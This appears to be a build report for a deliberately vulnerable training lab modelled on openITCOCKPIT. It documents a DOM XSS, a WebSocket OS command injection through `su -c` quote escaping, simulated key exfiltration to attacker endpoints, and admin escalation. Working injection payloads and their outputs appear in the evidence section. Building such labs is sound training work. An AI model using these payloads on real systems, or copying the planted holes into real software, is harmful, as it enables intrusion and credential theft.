# lab-70-tuff — openITCOCKPIT XSS + OS Command Injection

## Frame

- **Outcome**: lab-70-tuff implements the openITCOCKPIT DOM XSS + WebSocket OS injection lesson chain, including all extra miles.
- **Success line**: WebSocket injection via check_http `-k` single-quote escape into `su -c` returns command output; XSS bot simulation chain exfiltrates MONITOR_KEY to `/api/attacker/results`; extra mile DB escalation delivers FLAG_LOCAL from admin page.
- **Kill line**: None reached.
- **Smallest unit**: WebSocket path routing (ws v8 multiple-server bug fix).
- **Type**: build

## Work

### What was implemented

**New files:**
- `labs/lab-70-tuff/public/vendor/tuff-core.js` — vendor JS with DOM XSS via `build=` URL param → `document.write`
- `labs/lab-70-tuff/entrypoint.sh` — startup script (replaces inline CMD) for bcrypt hash computation and DB seeding

**Modified files:**
- `labs/lab-70-tuff/app.js`:
  - Added `path` import, vendor static serving at `/vendor`
  - Added `MONITOR_KEY` / `SCANNER_SESSION` constants from env
  - Added `/monitoring` route (auth via session OR X-Monitor-Token header for scanner)
  - Added attacker infrastructure: `/attacker/files`, `/attacker/collect`, `/api/attacker/results`
  - Added `/api/monitor/commands` CRUD (admin) and `/api/monitor/run` (admin execution)
  - Refactored all three WebSocket servers from separate `WebSocket.Server({path})` instances to a single `noServer: true` server with manual `server.on('upgrade')` routing (ws v8 path-routing bug fix)
  - Added `/ws/sudo_server` WebSocket: akey authentication, `execute_nagios_command` task, `ls` shows `/app/plugins`, `./check_*` commands run via `su tuffmon -c '${cmd}'`

- `labs/lab-70-tuff/workers/link_scanner.js`:
  - Extended `fetchUrl` to accept `monitorToken` (X-Monitor-Token header) and `fullBody` parameters
  - Added `simulateDomXss()`: detects `build=` param in reported URL, fetches the build script, checks for `/attacker/collect` pattern, fetches admin monitoring page with scanner token, extracts `monitor-key` value, calls `/attacker/collect` with exfiltrated key

- `labs/lab-70-tuff/Dockerfile`:
  - Added `monitoring-plugins` apt package
  - Added `tuffmon` system user (shell `/bin/sh` so `su tuffmon -c` works)
  - Added `/app/plugins/` symlinks to all `/usr/lib/nagios/plugins/check_*` binaries
  - Added `MONITOR_KEY=tuff-mon-k3y-7f2a1b9c` and updated `SCANNER_SESSION=tuff-scanner-x9k2m3p7`
  - Replaced inline CMD with `entrypoint.sh`

- `labs/lab-70-tuff/entrypoint.sh`:
  - Creates `/app/config/tuff.conf` with DB credentials (plain text, extra mile target)
  - Seeds `viewer` user with `bcrypt('viewer123')` hash computed at startup
  - Seeds `monitor_commands` table with two default check templates
  - Starts link_scanner background worker

- `platform/app.py`: updated tags and description for lab-70-tuff
- `hints/lab-70.json`: updated with openITCOCKPIT lesson-aligned hints

### Key bug fixes during implementation

1. **ws v8 multiple WebSocket.Server path routing**: In ws v8, each `WebSocket.Server({server, path})` instance registers an `upgrade` event handler. When the first server's handler fires for a non-matching path, it does NOT destroy the socket, but the second server's handler then tries to `handleUpgrade` an already-being-handled socket, resulting in 400 responses. Fixed by using `noServer: true` + single `server.on('upgrade')` handler routing by `req.url`.

2. **su -c shell injection quote parity**: The injection requires an even number of single quotes in the user-supplied cmd (template adds opening+closing quotes = 2 more). The lesson's canonical form `./check_http -I ip -p PORT -k 'test -c 'CMD '` has 4 quotes in cmd (2+2 pairs), making 6 total — valid shell. `'test -c 'id '` has 3 (odd) → unterminated string error.

3. **tuffmon user shell**: Initially set to `/usr/sbin/nologin` — `su tuffmon -c` fails with "This account is currently not available." Fixed to `/bin/sh`.

## Evidence

```
# WebSocket ls
RESPONSE: "check_apt\ncheck_breeze\n...check_http\n..."

# WebSocket injection (id)
cmd: ./check_http -I 127.0.0.1 -p 80 -k 'test -c 'id ''
RESPONSE: "uid=999(tuffmon) gid=999(tuffmon) groups=999(tuffmon)\n"

# WebSocket flag read
cmd: ./check_http -I 127.0.0.1 -p 80 -k 'test -c 'cat /flag_proof.txt ''
FLAG READ: "ARENA{test_proof}\n"

# XSS simulation chain
results: [{"data":"tuff-mon-k3y-7f2a1b9c","ts":"2026-06-15T22:01:36.671Z","ip":"::1"}]

# DB config read via injection
DB CONFIG: DB_HOST=127.0.0.1 / DB_PASS=tuffpass

# Admin elevation + FLAG_LOCAL
viewer updated: [{username:'viewer',is_admin:true}]
login: {ok:true,isAdmin:true}
admin page: <div class="flag">ARENA{test_local}</div>

# Admin custom command RCE
POST /api/monitor/commands: {"command_line":"cat /flag_proof.txt"}
POST /api/monitor/run: {"output":"ARENA{test_proof}\n"}

# validate_labs.sh
Summary: 66 PASS, 0 WARN, 0 FAIL
```
